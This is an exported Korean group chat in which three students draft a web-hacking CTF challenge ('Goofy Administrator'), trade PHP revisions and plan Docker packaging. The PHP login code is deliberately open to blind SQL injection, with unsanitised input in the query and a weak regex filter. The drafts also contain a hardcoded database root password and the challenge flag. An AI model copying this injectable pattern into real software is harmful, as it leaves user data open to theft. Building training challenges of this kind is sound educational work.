@@ -1,0 +1,2187 @@
+웹해킹 문제제작 1팀 님과 카카오톡 대화
+저장한 날짜 : 2021-03-26 22:59:23
+
+--------------- 2020년 9월 20일 일요일 ---------------
+김지수님이 송민영님, 송민영님, 남지윤님, 송민영님, 남지윤님, 김나진님을 초대하였습니다.
+[김지수] [오후 7:05] 안녕하세요 문제제작 나름 재밌다고 하니까 열심히 해봅시다~
+--------------- 2020년 9월 22일 화요일 ---------------
+[김지수] [오후 8:01] 또 정신이 없어서 바로 공지 못했네요. 제가 다른 것도 신경 써야해서 잘 살펴보지는 못 할 것 같습니다. 이번 주부터 문제 제작 하시면 되고, 세 분이 번갈아가면서 제가 진행 상황 확인할 수 있을 정도의 간단한 보고서만 제출해주세요. 저는 나가볼테니 세 분이서 편히 진행해주세요^^ 제게 부탁할 일이 생기면 언제든지 연락주세요.
+김지수님이 나갔습니다.
+--------------- 2020년 9월 25일 금요일 ---------------
+[남지윤] [오후 5:25] 여럽분
+[남지윤] [오후 5:25] 해야하네요,,,
+[남지윤] [오후 5:25] 피할수없어도 피허고싶지만
+[남지윤] [오후 5:25] 불가능입니다
+[김나진] [오후 5:26] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오후 5:26] sql 문제 제작이었나?
+[송민영] [오후 5:28] 응응
+--------------- 2020년 9월 26일 토요일 ---------------
+[김나진] [오후 2:09] 우선 이번주는 회의만 하자...
+[김나진] [오후 2:09] 내일 시간돼?
+[김나진] [오후 2:09] 난 오늘 c랑 웹 둘 다 해야 하거든.. 그래픽도 해결해야 하고..
+[남지윤] [오후 2:10] 웅ㅇ
+[송민영] [오후 2:19] 그래그래
+--------------- 2020년 9월 27일 일요일 ---------------
+[김나진] [오후 12:17] 몇시부터 할까?
+[남지윤] [오후 12:32] 나 여섯시 이후에 괜찮을꺼같아
+[남지윤] [오후 12:32] ㅜㅠ
+[김나진] [오후 1:34] 오케이
+[김나진] [오후 1:34] 그러면 6시에 볼까?
+[송민영] [오후 1:44] 그래
+[김나진] [오후 6:00] 이제 해볼까...
+[김나진] [오후 6:02] 이모티콘
+[남지윤] [오후 6:04] 조아...
+[김나진] [오후 6:04] 뭐부터 해야할까?
+[김나진] [오후 6:04] 문제를 만들어야 하는데 뭘 해야하는지 몰라
+[송민영] [오후 6:05] 그냥 webhacking.kr이나 los에서 쉬운거 비슷하게 만들면 되지 않을까
+[남지윤] [오후 6:05] 나도 그렇게생각햏ㅎ
+[김나진] [오후 6:07] 그러면 los나 webhacking.kr에서 괜찮은 문제 하나씩 골라보자
+[송민영] [오후 6:08] 웹해킹.kr에서 7번 괜찮았던거 같애
+[김나진] [오후 6:17] 나는 웹해킹 27번
+[남지윤] [오후 6:19] 나ㄴ도 찾아봐볼게...!!
+[남지윤] [오후 6:19] 지금 노트북이업써서
+[김나진] [오후 6:20] 그리고 los15도 꽤 신기했어
+[송민영] [오후 6:24] 27번 괜찮은거 같은데
+[남지윤] [오후 6:24] Sql인젝션으로 찾아보고있는거야?
+[김나진] [오후 6:24] 응
+--------------- 2020년 10월 3일 토요일 ---------------
+[송민영] [오후 3:33] 우리 보고서 쓰는거 어찌해야되지
+[김나진] [오후 5:07] 음....
+[김나진] [오후 5:08] 우리가 고른 문제들 공통점 찾아서 ~한 방향으로 문제를 만들겠다 이러면 되지 않을까
+[송민영] [오후 5:37] 그럴까 그럼
+[송민영] [오후 5:37] 기본적으로 27번 바탕으로 가고
+[송민영] [오후 5:37] 좀 더 추가할 것은 추가하고 그런식으로?
+[남지윤] [오후 5:42] 좋아!!!
+[김나진] [오후 6:57] 그러자
+--------------- 2020년 10월 4일 일요일 ---------------
+[송민영] [오후 8:15] 파일: 웹해킹 문제 보고서.docx
+[송민영] [오후 8:15] 이렇게 적으면 될려나
+[남지윤] [오후 8:29] 그 치,,,?
+[남지윤] [오후 8:29] 근데 거의 복붙해서 써도되는건가,,?
+[남지윤] [오후 8:29] 아니면 아예 다 해야되는건가,,
+[남지윤] [오후 8:30] 삭제된 메시지입니다.
+[송민영] [오후 8:43] 그러게..
+[송민영] [오후 8:43] 그럼 저렇게 제출할게
+[김나진] [오후 9:11] 그러면 다음주에는 내가 제출할거
+[김나진] [오후 9:11] 게
+[남지윤] [오후 9:11] 그럼 그 담주에는 내가!!
+--------------- 2020년 10월 27일 화요일 ---------------
+[송민영] [오후 12:31] 우리 문제 제작 어째
+[송민영] [오후 12:31] 이번주까지라던데
+[남지윤] [오후 12:48] 그러게 이번주 빡세게해야겠네ㅠ
+[남지윤] [오후 12:48] 나 방금 셤끝나서
+[남지윤] [오후 12:48] 할수있어!!
+[남지윤] [오후 12:48] 딴사람들은?!?
+[남지윤] [오후 12:48] 셤끝났낭
+[송민영] [오후 12:49] 나 월욜까지
+[송민영] [오후 12:49] 김윤진 교수님 수업
+[송민영] [오후 12:49] PPT 동영상 만들기 있어ㅠ
+[김나진] [오후 1:33] 난 다 끝났어
+--------------- 2020년 10월 28일 수요일 ---------------
+[송민영] [오후 5:14] 우리 그럼
+[송민영] [오후 5:14] 대충 컨셉은 정해야되지 않을까
+[송민영] [오후 5:14] 코드는 그냥 배낀다고해도
+[남지윤] [오후 5:15] 혹시 내일 다들 낮에 머해?!?
+[남지윤] [오후 5:15] 카톡으로는 쪼끔 무리일꺼같고
+[송민영] [오후 5:15] 내일 1시이후로는 괜찮아
+[남지윤] [오후 5:15] 디코같은거 하면 좋을꺼같은데
+[남지윤] [오후 5:16] 나진이 한시에 시간괜찮아??
+[김나진] [오후 6:17] 오 너무 좋지
+[남지윤] [오후 6:20] 그럼 낼 한시에 디코켜서 회의하고 만들수있으면 만들어버리기까지할까....???
+[김나진] [오후 6:20] 그래 해버리자
+[송민영] [오후 6:20] 그래그래
+--------------- 2020년 10월 29일 목요일 ---------------
+[송민영] [오후 1:03] 다들 디코에 들어와있닝
+[김나진] [오후 1:03] 내가 디코 지웠더라고 그래서 다시 까는 중이야
+[송민영] [오후 1:03] 오키오키
+[김나진] [오후 1:04] 디스코드 다 깔았어
+[송민영] [오후 1:05] 친구 추가해서 해야되나
+[송민영] [오후 1:05] 지윤이는 왜 안오지
+[김나진] [오후 1:06] 그러게
+[송민영] [오후 1:06] 10분까지 기다리고 안오면 우리끼리 하자
+[김나진] [오후 1:06] 그래
+[남지윤] [오후 1:36] 헐랭
+[남지윤] [오후 1:36] 미안해ㅠㅠㅠㅜ
+[남지윤] [오후 1:36] 언넝증너갈게
+[남지윤] [오후 1:39] 둘이 어느채널에서
+[남지윤] [오후 1:39] 하고있어..?!?!
+[남지윤] [오후 1:45] 안해혹시?!?
+[송민영] [오후 1:45] 디코 아이디 알려줄래
+[남지윤] [오후 1:45] 둘이 개인전화하나..
+[남지윤] [오후 1:45] 아읻
+[남지윤] [오후 1:45] 아이디?!?!
+[송민영] [오후 2:59] 샵검색: #사다리게임
+[김나진] [오후 4:23] <?php
+  //include "./confing.php";
+  //dbconnect();
+  $connect = mysqli_connect('localhost', 'root', '3190024jina', 'problem');
+  if(preg_match("/prob|_|\.|\(\)/i", $_GET['pw'])) exit("No Hack ~~");
+
+  $result = @mysql_fetch_array(mysql_query($query));
+  if($result['id']) echo '<script>alert("login fail");</script>';
+  else if($result['id']=='admin') echo "<script>alert('Hello {$result[id]}');</script>";
+
+  $_GET['pw']=addslashes($_GET['pw']);
+  $query="select pw from user where id='admin' and pw='{$_GET['pw']}'";
+  $result=@mysql_fetch_array(mysql_query($query));
+  if(($result['id']=='admin')&&($result['pw']) && ($result['pw'] == $_GET['pw'])) echo "<script>alert('FLAG');</script>";
+  if(($result['id']=='admin')&&($result['pw']) && ($result['pw'] != $_GET['pw'])) echo "<script>alert('login fail');</script>";
+
+ ?>
+[김나진] [오후 4:24] 삭제된 메시지입니다.
+[송민영] [오후 4:25]   $query = "select id from user where id='guest' and pw='{$_GET['pw']}'";
+[남지윤] [오후 4:26] config.php
+[남지윤] [오후 4:26] 오타이ㅣㅆ다
+[송민영] [오후 4:41] <?php
+  //include "./confing.php";
+  //dbconnect();
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET['pw'])) exit("No Hack ~_~");
+
+  $query = "select id from user where id='guest' and pw='{$_GET['pw']}'";
+  $result = mysqli_fetch_array(mysqli_query($query));
+  if($result['id']) echo '<script>alert("Hello");</script>';
+
+  $_GET['pw']=addslashes($_GET['pw']);
+  $query="select pw from user where id='admin' and pw='{$_GET['pw']}'";
+  $result=mysqli_fetch_array(mysqli_query($query));
+  if(($result['id']=='admin')&&($result['pw']) && ($result['pw'] == $_GET['pw'])) echo "<script>alert('FLAG');</script>";
+  if(($result['id']=='admin')&&($result['pw']) && ($result['pw'] != $_GET['pw'])) echo "<script>alert('login fail');</script>";
+
+ ?>
+[송민영] [오후 4:47] <?php
+  //include "./confing.php";
+  //dbconnect();
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET['pw'])) exit("No Hack ~_~");
+
+  $query = "select id from user where id='guest' and pw='{$_GET['pw']}'";
+  $result = mysqli_fetch_array(mysqli_query($query));
+  if($result['id']) echo '<script>alert("Hello");</script>';
+
+  $_GET['pw']=addslashes($_GET['pw']);
+  $query="select pw from user where id='admin' and pw='{$_GET['pw']}'";
+  $result=mysqli_fetch_array(mysqli_query($query));
+  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) echo "<script>alert('FLAG');</script>";
+
+
+ ?>
+[송민영] [오후 4:53] <?php
+  //include "./confing.php";
+  //dbconnect();
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET['pw'])) exit("No Hack ~_~");
+
+  $query = "select id from user where id='admin' and pw='{$_GET['pw']}'";
+  $result = mysqli_fetch_array(mysqli_query($query));
+  if($result['id']) echo '<script>alert("Hello");</script>';
+
+  $_GET['pw']=addslashes($_GET['pw']);
+  $query="select pw from user where id='admin' and pw='{$_GET['pw']}'";
+  $result=mysqli_fetch_array(mysqli_query($query));
+  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) echo "<script>alert('FLAG');</script>";
+
+
+ ?>
+[남지윤] [오후 4:55] 나 이런얘기해서 진짜진짜진짜 너무 미안한데 나 저녁 약ㄱ속이 있는데 이렇게 회의 길어질줄 몰랐어,,,,,,,
+[남지윤] [오후 4:55] 약속미루려고했는데 친구가 화가 잔뜩났어….
+[남지윤] [오후 4:59] 토요일저녁전
+[남지윤] [오후 4:59] 나진이안되고
+[송민영] [오후 4:59] 일요일에 윤진킴의
+[송민영] [오후 4:59] ppt를 해야돼
+[남지윤] [오후 4:59] 컴수??@
+[송민영] [오후 4:59] 논리와 논술
+[남지윤] [오후 4:59] 아아
+[송민영] [오후 5:00] 빨리 끝내고 싶긴한데
+[송민영] [오후 5:00] 지금 강의도 2개만 들음...
+[송민영] [오후 5:01] 2시 반부터 준비해서 나가야되는데
+[송민영] [오후 5:01] 그전에 일이 있어서
+[남지윤] [오후 5:01] 나는 오늘 저녁빼고는 다되긴하는데
+[송민영] [오후 5:06] 이거?
+[김나진] [오후 5:22] if(preg_match('/prob|_|\.|\(\)/i', $_GET['pw'])) exit("No Hack ~_~");
+
+$query = "select id from user where id='admin' and pw='{$_GET['pw']}'";
+$result = mysqli_fetch_array(mysqli_query($connect, $query));
+if($result===false) echo '<script>alert("Bye");history.back();</script>';
+else echo '<script>alert("Hello");</script>';
+
+$_GET['pw']=addslashes($_GET['pw']);
+$query="select pw from user where id='admin' and pw='{$_GET['pw']}'";
+$result=mysqli_fetch_array(mysqli_query($connect, $query));
+if(($result['pw']) && ($result['pw'] == $_GET['pw'])) echo "<script>alert('FLAG');</script>";
+[송민영] [오후 5:26] <?php
+  //include "./confing.php";
+  //dbconnect();
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET['pw'])) exit("No Hack ~_~");
+
+  $query = "select id from user where id='admin' and pw='{$_GET['pw']}'";
+  $sql = mysqli_query($connect, $query)
+  if($sql===false) echo '<script>alert("Bye");history.back();</script>';
+  else echo '<script>alert("Hello");</script>';
+
+  $query = "select id from user where id='admin' and pw='{$_GET['pw']}'";
+  $result = mysqli_fetch_array(mysqli_query($query));
+  if($result['id']) echo '<script>alert("Hello");history.back();</script>';
+
+  $_GET['pw']=addslashes($_GET['pw']);
+  $query="select pw from user where id='admin' and pw='{$_GET['pw']}'";
+
+  $result=mysqli_fetch_array(mysqli_query($query));
+
+  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) echo "<script>alert('FLAG');</script>";
+
+
+ ?>
+[송민영] [오후 5:30] <?php
+  //include "./confing.php";
+  //dbconnect();
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET['pw'])) exit("No Hack ~_~");
+
+  $query = "select id from user where id='admin' and pw='{$_GET['pw']}'";
+
+  $result = mysqli_num_rows(mysqli_query($connect,$query));
+  if($result==0) echo '<script>alert("Bye");history.back();</script>';
+  else echo '<script>alert("Hello");</script>';
+
+  $query = "select id from user where id='admin' and pw='{$_GET['pw']}'";
+  $result = mysqli_fetch_array(mysqli_query($connect,$query));
+  if($result['id']) echo '<script>alert("Hello");history.back();</script>';
+
+  $_GET['pw']=addslashes($_GET['pw']);
+  $query="select pw from user where id='admin' and pw='{$_GET['pw']}'";
+
+  $result=mysqli_fetch_array(mysqli_query($connect,$query));
+
+  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) echo "<script>alert('FLAG');</script>";
+
+
+ ?>
+[송민영] [오후 5:39] <?php
+  //include "./confing.php";
+  //dbconnect();
+  ?>
+
+
+<html>
+<head>
+<title>Goofy Administrator</title>
+<style type="text/css">
+body { background:black; color:white; font-size:10pt; }
+input { background:silver; color:black; font-size:9pt; }
+</style>
+</head>
+<body><br><br>
+<center>
+<form method=get action=index_process.php>
+<table border=0 align=center cellpadding=10 cellspacing=0>
+<tr><td colspan=2 align=center><h1>Goofy Administrator</h1></td></tr>
+<tr><td align=center>id : <input name=id size=30 value='admin' disabled></td><td></td></tr>
+<tr><td align=center>pw : <input name=pw size=30></td><td><input type=submit></td></tr>
+</form>
+<?
+if(preg_match('/prob|_|\.|\(\)/i', $_GET['pw'])) exit("No Hack ~_~");
+
+$query = "select id from user where id='admin' and pw='{$_GET['pw']}'";
+$result = mysqli_fetch_array(mysqli_query($connect, $query));
+if($result===false) echo 'Bye';
+else echo 'alert("Hello");';
+
+$_GET['pw']=addslashes($_GET['pw']);
+$query="select pw from user where id='admin' and pw='{$_GET['pw']}'";
+$result=mysqli_fetch_array(mysqli_query($connect, $query));
+if(($result['pw']) && ($result['pw'] == $_GET['pw'])) echo "FLAG";
+?>
+</center>
+</body>
+</html>
+[김나진] [오후 5:46] <?php
+  //include "./confing.php";
+  //dbconnect();
+  $connect = mysqli_connect('localhost', 'root', '3190024jina', 'problem');
+  ?>
+
+
+<html>
+<head>
+<title>Goofy Administrator</title>
+<style type="text/css">
+body { background:white; color:black; font-size:10pt; }
+input { background:silver; color:black; font-size:9pt; }
+</style>
+</head>
+<body><br><br>
+<center>
+<form method=get action=index_process.php>
+<table border=0 align=center cellpadding=10 cellspacing=0>
+<tr><td colspan=2 align=center><h1>Goofy Administrator</h1></td></tr>
+<tr><td align=center>id : <input name=id size=30 value='admin' disabled></td><td></td></tr>
+<tr><td align=center>pw : <input name=pw size=30></td><td><input type=submit></td></tr>
+</form>
+<?
+if(preg_match('/prob|_|\.|\(\)/i', $_GET['pw'])) exit("No Hack ~_~");
+
+$query = "select id from user where id='admin' and pw='{$_GET['pw']}'";
+$result = mysqli_fetch_array(mysqli_query($connect, $query));
+if($result===false) echo '<h2>Bye</h2>';
+else echo "<h2>Hello admin!</h2>";
+
+$_GET['pw']=addslashes($_GET['pw']);
+$query="select pw from user where id='admin' and pw='{$_GET['pw']}'";
+$result=mysqli_fetch_array(mysqli_query($connect, $query));
+if(($result['pw']) && ($result['pw'] == $_GET['pw'])) echo "FLAG";
+?>
+</center>
+</body>
+</html>
+[송민영] [오후 5:49] <?php
+  //include "./confing.php";
+  //dbconnect();
+  ?>
+
+<html>
+<head>
+<title>Goofy Administrator</title>
+<style type="text/css">
+body { background:white; color:black; font-size:10pt; }
+input { background:silver; color:black; font-size:9pt; }
+</style>
+</head>
+<body><br><br>
+<center>
+<form method=get action=index_process.php>
+<table border=0 align=center cellpadding=10 cellspacing=0>
+<tr><td colspan=2 align=center><h1>Goofy Administrator</h1></td></tr>
+<tr><td align=center>id : <input name=id size=30 value='admin' disabled></td><td></td></tr>
+<tr><td align=center>pw : <input name=pw size=30></td><td><input type=submit></td></tr>
+</form>
+<?
+if(preg_match('/prob|_|\.|\(\)/i', $_GET['pw'])) exit("No Hack ~_~");
+
+$query = "select id from user where id='admin' and pw='{$_GET['pw']}'";
+$result = mysqli_fetch_array(mysqli_query($connect, $query));
+if($result['id']) echo "<h2>Hello admin</h2>";
+$_GET['pw']=addslashes($_GET['pw']);
+$query="select pw from user where id='admin' and pw='{$_GET['pw']}'";
+$result=mysqli_fetch_array(mysqli_query($connect, $query));
+if(($result['pw']) && ($result['pw'] == $_GET['pw'])) echo "FLAG";
+?>
+</center>
+</body>
+</html>
+[김나진] [오후 5:55] <?php
+  //include "./confing.php";
+  //dbconnect();
+  $connect = mysqli_connect('localhost', 'root', '3190024jina', 'problem');
+  ?>
+
+
+<html>
+<head>
+<title>Goofy Administrator</title>
+<style type="text/css">
+body { background:white; color:black; font-size:10pt; }
+input { background:silver; color:black; font-size:9pt; }
+</style>
+</head>
+<body><br><br>
+<center>
+<form method=get action=index_process.php>
+<table border=0 align=center cellpadding=10 cellspacing=0>
+<tr><td colspan=2 align=center><h1>Goofy Administrator</h1></td></tr>
+<tr><td align=center>id : <input name=id size=30 value='admin' disabled></td><td></td></tr>
+<tr><td align=center>pw : <input name=pw size=30></td><td><input type=submit></td></tr>
+</form>
+<?php
+if(preg_match('/prob|_|\.|\(\)/i', $_GET['pw'])) exit("No Hack ~_~");
+
+$query = "select id from user where id='admin' and pw='{$_GET['pw']}'";
+$result = mysqli_fetch_array(mysqli_query($connect, $query));
+if($result===null) echo '<h2>Bye</h2>';
+else echo "<h2>Hello admin!</h2>";
+
+$_GET['pw']=addslashes($_GET['pw']);
+$query="select pw from user where id='admin' and pw='{$_GET['pw']}'";
+$result=mysqli_fetch_array(mysqli_query($connect, $query));
+if(($result['pw']) && ($result['pw'] == $_GET['pw'])) echo "FLAG";
+?>
+</center>
+</body>
+</html>
+[김나진] [오후 6:22] <?php
+  //include "./confing.php";
+  //dbconnect();
+  $connect = mysqli_connect('localhost', 'root', '3190024jina', 'problem');
+  ?>
+
+
+<html>
+<head>
+<title>Goofy Administrator</title>
+<style type="text/css">
+body { background:white; color:black; font-size:10pt; }
+input { background:silver; color:black; font-size:9pt; }
+</style>
+</head>
+<body><br><br>
+<center>
+<form method=get action=index_process.php>
+<table border=0 align=center cellpadding=10 cellspacing=0>
+<tr><td colspan=2 align=center><h1>Goofy Administrator</h1></td></tr>
+<tr><td align=center>id : <input name=id size=30 value='admin' disabled></td><td></td></tr>
+<tr><td align=center>pw : <input name=pw size=30></td><td><input type=submit></td></tr>
+</form>
+<?php
+if(preg_match('/prob|_|\.|\(\)/i', $_GET['pw'])) exit("No Hack ~_~");
+
+$query = "select id from user where id='admin' and pw='{$_GET['pw']}'";
+$result = mysqli_fetch_array(mysqli_query($connect, $query));
+if($result===null) echo '<h2>Bye</h2>';
+else {echo "<h2>Hello admin!</h2>";
+
+$_GET['pw']=addslashes($_GET['pw']);
+$query="select pw from user where id='admin' and pw='{$_GET['pw']}'";
+$result=mysqli_fetch_array(mysqli_query($connect, $query));
+if(($result['pw']) && ($result['pw'] == $_GET['pw'])) echo "FLAG";
+}
+?>
+</center>
+</body>
+</html>
+[송민영] [오후 6:25] <?php
+  //include "./confing.php";
+  //dbconnect();
+  $connect = mysqli_connect('localhost', 'root', '3190024jina', 'problem');
+  ?>
+
+
+<html>
+<head>
+<title>Goofy Administrator</title>
+<style type="text/css">
+body { background:white; color:black; font-size:10pt; }
+input { background:silver; color:black; font-size:9pt; }
+</style>
+</head>
+<body><br><br>
+<center>
+<form method=get action=index_process.php>
+<table border=0 align=center cellpadding=10 cellspacing=0>
+<tr><td colspan=2 align=center><h1>Goofy Administrator</h1></td></tr>
+<tr><td align=center>id : <input name=id size=30 value='admin' disabled></td><td></td></tr>
+<tr><td align=center>pw : <input name=pw size=30></td><td><input type=submit></td></tr>
+</form>
+<?php
+if(preg_match('/prob|_|\.|\(\)/i', $_GET['pw'])) exit("No Hack ~_~");
+
+$query = "select id from user where id='admin' and pw='{$_GET['pw']}'";
+$result = mysqli_fetch_array(mysqli_query($connect, $query));
+if($result===null) echo '<h2>Bye</h2>';
+else {echo "<h2>Hello admin!</h2>";
+
+$$_GET['pw']=addslashes($_GET['pw']);
+$query="select pw from user where id='admin' and pw='{$_GET['pw']}'";
+$result=mysqli_fetch_array(mysqli_query($connect, $query));
+if($result===true)
+  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) echo "FLAG";
+}
+?>
+</center>
+</body>
+</html>
+[김나진] [오후 6:37] <html>
+  <head>
+  <title>Goofy Administrator</title>
+  <style type="text/css">
+  body { background:white; color:black; font-size:10pt; }
+  input { background:silver; color:black; font-size:9pt; }
+  </style>
+  </head>
+  <body><br><br>
+  <center>
+  <form method=get action=index_process.php>
+  <table border=0 align=center cellpadding=10 cellspacing=0>
+  <tr><td colspan=2 align=center><h1>Goofy Administrator</h1></td></tr>
+  <tr><td align=center>id : <input name=id size=30 value='admin' disabled></td><td></td></tr>
+  <tr><td align=center>pw : <input name=pw size=30></td><td><input type=submit></td></tr>
+  </form>
+  <?php
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET['pw'])) exit("No Hack ~_~");
+
+  $query = "select id from user where id='admin' and pw='{$_GET['pw']}'";
+  $result = mysqli_fetch_array(mysqli_query($connect, $query));
+  if($result===null) echo '<h2>Bye</h2>';
+  else {echo "<h2>Hello admin!</h2>";
+
+  $_GET['pw']=addslashes($_GET['pw']);
+  $query="select pw from user where id='admin' and pw='{$_GET['pw']}'";
+  $result=mysqli_fetch_array(mysqli_query($connect, $query));
+  if($result)
+    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) echo "POX{v4cc1ne_p4ssw0rd_9et_daedanhae}";
+  }
+  ?>
+  </center>
+  </body>
+  </html>
+--------------- 2020년 11월 1일 일요일 ---------------
+[김나진] [오후 9:40] 우리가 만든거 도커파일로 만들어달래
+[김나진] [오후 9:40] 도커파일로 만드는 거는 재아 언니가 알고 있대
+[남지윤] [오후 9:43] 연락해볼게!!
+[남지윤] [오후 9:48] 모른다는데..?!?
+[김나진] [오후 9:48] 지수언니가 지칭한 재아씨가 재아언니가 아닌가????????
+[김나진] [오후 9:49] 구글링으로...  해야하는건가..
+[송민영] [오후 9:51] ...??
+[송민영] [오후 9:51] 어찌해야되지..
+[남지윤] [오후 9:51] 맞을 ㅔㄴ데
+[김나진] [오후 9:52] 최대한 빨리? 내가 늦게 답변 줘서 미안해 근데 재아씨가 어떻게 하는지 좀 알고 있을거야
+[김나진] [오후 9:52] 이렇게 언니가 톡해줬는데...
+[김나진] [오후 9:52] 구글링 해야겠다..
+[남지윤] [오후 10:27] https://www.slideshare.net/pyrasis/docker-fordummies-44424016
+[김나진] [오후 10:34] 응 그리고 저번에 보여줬던 것 처럼 문제 컨셉이랑 풀이도 같이 정히해서 올려주ㅏ
+[김나진] [오후 10:35] 또 다른 요청사항이야~
+[송민영] [오후 10:43] 빠르게 과제 끝내고 올게...
+[송민영] [오후 10:44] 문제 컨셉하고 풀이는 내가 적을테니깐 다른거 먼저 하고 있어
+[남지윤] [오후 10:47] 그럼 난 도커 공부하고있을까?
+[김나진] [오후 10:48] 나도 도커공부 할래
+[남지윤] [오후 10:48] 아고랭??
+[남지윤] [오후 10:48] 일단 내가 재아언니한테
+[남지윤] [오후 10:48] 최대한정보얻어볼게
+[김나진] [오후 10:48] 그래
+--------------- 2020년 11월 2일 월요일 ---------------
+[송민영] [오전 3:36] 1. 문제 컨셉 : 코로나 정보를 관리하는 관리자가 비밀번호를 잃어버렸다...! 비밀번호를 찾을수 있는 유일한 방법은 임시계정으로 비밀번호를 찾는 것이다. 근데 임시계정의 비밀번호도 잃어버렸다. 따라서 임시계정의 비밀번호를 찾고 관리자의 비밀번호를 알아내자!
+2. 문제 풀이 : id는 admin으로 고정이고 pw만 입력할수 있는 폼이 있다. pw의 길이를 먼저 알아내고 자동화 코드 혹은 substr함수를 직접 입력을 하여 pw의 문자열을 알아낸다.
+--------------- 2020년 11월 3일 화요일 ---------------
+[김나진] [오후 4:31] 우리 제목도 정해야 해
+[김나진] [오후 4:31] 파일: pox2020_vaccineweb.zip
+[김나진] [오후 4:31] 그리고 이건 다른 사람이 만든 문제 파일이래 참고하면 될 것 같아
+[송민영] [오후 6:22] 제목은 goofy admin 아니야?
+[남지윤] [오후 6:24] 웅마져 그때 그렇게정했었던거같은데??
+[김나진] [오후 7:04] 오키
+[송민영] [오후 10:44] 우리 그럼 도커 파일만 만들면 되는거야?
+[김나진] [오후 10:50] 그런듯
+--------------- 2020년 11월 4일 수요일 ---------------
+[송민영] [오전 12:09] 그거 오래걸릴거 같니
+[송민영] [오전 12:09] 도커 파일 만드는거
+[김나진] [오전 12:19] 좀 걸리겠지...?  내일 한번 시작해보려고
+[송민영] [오전 12:24] ㅠㅠㅠ
+[김나진] [오전 12:24] ,..?
+[송민영] [오전 12:24] 그냥 이상황이
+[송민영] [오전 12:24] ㅠㅠ
+[송민영] [오전 12:24] 해서
+[송민영] [오전 12:24] ㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오전 12:24] ㅋㅋㅋㅋㅋㄱㅋㅋㄱㅋㅋㅋㅋ
+[송민영] [오전 12:25] 혹시 도와줄거 뭐있니
+[김나진] [오전 12:25] 음...  나중에 생기면 말할게
+[김나진] [오전 12:26] 아직 시작도 안한 상태여서...ㅋ
+[송민영] [오전 12:26] 그래그래
+[송민영] [오전 12:27] 그래도 문제 빠꾸 먹진 않았지...?
+[김나진] [오전 12:27] ㅇㅇ 도커파일로 만들어 달랬으니까 빠꾸는 아닐거야
+[송민영] [오전 12:27] 다행이다
+[남지윤] [오전 12:55] 저쪽ㅇ팀도 아직 도커파일로 만드는거 못한거같긴해
+[송민영] [오전 12:58] 저쪽팀 아직 문제 제작중이라는데
+[남지윤] [오전 1:03] 도커파일
+[남지윤] [오전 1:03] 몇일째만들고있다고 들었는데 나는
+[김나진] [오전 1:03] 오 그거 참 큰일이군
+[김나진] [오전 1:03] 내일이라도 당장 시작해야겠는걸
+[송민영] [오전 1:03] 난 오늘 물어보니깐
+[송민영] [오전 1:03] 문제 수정중이라고
+[송민영] [오전 1:03] 그러던데
+--------------- 2020년 11월 5일 목요일 ---------------
+[남지윤] [오후 9:38] 나진아 도커해봤어?
+[남지윤] [오후 9:38] 어디에 다운받았어?
+[남지윤] [오후 9:38] 나 리눅스안에하려고하는데
+[남지윤] [오후 9:38] 잘안되네..
+[김나진] [오후 9:45] 나는 윈도우에다가 설치했어
+[김나진] [오후 9:45] 노트북이 윈도우라...
+[김나진] [오후 9:46] 지윤이가 쓰는 pc에다가 다운받으려는거야?
+[김나진] [오후 9:47] 지금 가장 큰 문제가 mysql로 만든 데이터 베이스를 어떻게 도커파일로 만드느냐인 것 같아...php도 문제고...  다 문제네...
+[송민영] [오후 9:55] https://subicura.com/2017/01/19/docker-guide-for-beginners-2.html
+[송민영] [오후 9:55] 여기보면
+[송민영] [오후 9:55] mysql 5.7 container에
+[송민영] [오후 9:55] 나와있는거 같은데
+[송민영] [오후 9:58] https://ddn-tech.tistory.com/10
+[김나진] [오후 9:58] !!!!!!!!!
+[김나진] [오후 9:59] 헐 과제 끝나고 함 해볼게
+--------------- 2020년 11월 6일 금요일 ---------------
+[남지윤] [오후 5:09] 난 해봤는데
+[남지윤] [오후 5:09] 환경구축이 제ㅐㄷ로 안되어있나봐..
+[김나진] [오후 5:10] 환경구축?
+[남지윤] [오후 5:10] 어엉ㅇ
+[남지윤] [오후 5:10] 그냥 이거 리눅스에도 해보고
+[남지윤] [오후 5:10] 포기하고
+[남지윤] [오후 5:10] 윈도우에하는중인데
+[남지윤] [오후 5:10] 나진아 너 윈도우에서 머가 돼??
+[남지윤] [오후 5:11] 나 명령어가 안먹히네
+[김나진] [오후 5:11] 나 아직 boot2docker 밖에 안해봤는데 mysql 이미지생성하고 이걸로 컨테이너 만들어서 테이블 만든거 다시 이미지로 만드는 것까지 했어 php는 아직 안해봤어
+[김나진] [오후 5:13] boot2docker로 하면서 든 의문이 여기서 만든 파일을 어떻게 다른 사람에게 보낼 수 있는지 모르겠어
+[남지윤] [오후 5:19] php코드 ->  php7-fpm 도커이미지로 컨테이너 생성 -> mysql 연동 -> nginx에 php 적용 -> https적용
+[남지윤] [오후 5:19] 살짝
+[남지윤] [오후 5:19] 이런느낌
+[남지윤] [오후 5:19] 인거같은데
+[김나진] [오후 5:23] 음...
+[남지윤] [오후 5:23] 나진아
+[남지윤] [오후 5:23] 정 ㅟ에
+[남지윤] [오후 5:23] https://ddn-tech.tistory.com/10
+[남지윤] [오후 5:23] 이거
+[남지윤] [오후 5:24] 첫번째 명령어 실행돼?
+[남지윤] [오후 5:24] stfp유저생성
+[남지윤] [오후 5:24] 명령어 먹혀??
+[김나진] [오후 5:24] boot2docker로?
+[남지윤] [오후 5:26] 웅ㅇ
+[남지윤] [오후 5:27] 재아언니랑 나는 첫번째명령어부터 막히거든
+[김나진] [오후 5:30] 사진
+[김나진] [오후 5:31] 이렇게 되는 게 맞나?
+[남지윤] [오후 5:33] 맞는거가틍데?
+[김나진] [오후 5:35] 사진
+[김나진] [오후 5:35] 다음 명령어 4줄 했고...
+[남지윤] [오후 5:36] 저기서 막히네
